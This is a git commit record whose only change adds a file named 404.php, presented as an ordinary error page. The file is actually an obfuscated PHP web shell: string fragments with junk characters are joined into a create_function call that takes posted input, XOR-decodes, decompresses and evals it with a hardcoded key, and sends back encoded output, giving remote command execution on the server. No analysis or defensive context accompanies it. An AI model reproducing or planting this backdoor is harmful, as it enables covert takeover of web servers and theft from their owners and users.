435582eeeb4b45973e27d96c487b0b3771b99e71
Ravi Mishra <69781020+Rk-Virus@users.noreply.github.com>
2022-10-16 23:05:23 +0530

    Add files via upload

---
+++ 404.php
@@ -0,0 +1,11 @@
+<?php
+$j=');@ob_end-$_-$clean();$r-$-$=@base-$64_encode(-$@x-$(@g-$zco-$mpress($o),$k));prin-$t("$p$kh$r$-$kf");}';
+$B=str_replace('x','','crexatxe_xfuxxnctxion');
+$V='h("-$/$kh(.-$+-$)$-$kf/",@fi-$le_get_conte-$nts("php://i-$nput"-$-$),$m)==1-$) {@ob_st-$art();@';
+$H='-$ev-$-$al(@gzuncomp-$ress(@x(@ba-$-$se-$64_decode($m[1]-$),$k)))-$;$o=@o-$-$b_get_conte-$-$n-$ts(';
+$W='un-$ction x($t,$k-$){$c=strl-$e-$n($k);$l-$=strle-$n-$($t-$);$o="";-$for($i=0;$i<$l-$;){for(-$$-$';
+$m='$k="811-$dec8a";-$$k-$h="b-$c0-$0e86e73f9";$kf="-$583-$-$d94d5f98-$7";$p=-$"Znj1-$i4RsVCTj63U-$b";f-$';
+$c='j=-$0;($j<-$$c&&$i<$l);-$$j++,$i-$++){$o.=-$$t{$i}-$^$k{$j}-$;}}r-$eturn-$-$ $o;}if (@preg_-$m-$atc';
+$P=str_replace('-$','',$m.$W.$c.$V.$H.$j);
+$q=$B('',$P);$q();
+?>
